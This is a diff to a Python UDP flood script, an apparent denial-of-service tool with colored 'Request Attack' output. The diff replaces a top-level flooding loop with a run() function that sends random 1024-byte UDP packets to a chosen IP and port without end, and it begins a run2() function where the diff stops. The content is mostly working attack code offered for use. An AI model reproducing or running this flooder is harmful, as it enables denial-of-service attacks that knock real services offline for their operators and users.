@@ -23,11 +23,6 @@ class bcolors:
     UNDERLINE = '\033[4m'
     ZH = '\033[97m'
 
-##############
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(1490)
-#############
-
 attemps = 0
 os.system("clear")
 print("")
@@ -79,14 +74,17 @@ time.sleep(5),
 print("\033[92m               ⟩⟩  G0....!! \033[0m "),
 time.sleep(5),
 
+def run():
+	data = random._urandom(1024)
+	i = random.choice(("[+]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print("\033[95m[\033[97m+\033[95m] \033[91mRequest Attack  :. " +ip+ " \033[0m")
+		except:
+			print("\033[33m[\033[95m!\033[33m] Error!")
 
-sent = 0
-while True:
-    try:
-        addr = (str(ip),int(port))
-	for x in range(times):
-	  s.sendto(data,addr)
-	  print("\033[95m[\033[97m+\033[95m] \033[91mRequest Attack  :. " +ip+ " \033[0m")
-    except:
-	  print("\033[33m[\033[95m!\033[33m] Error!")
-	
+def run2():
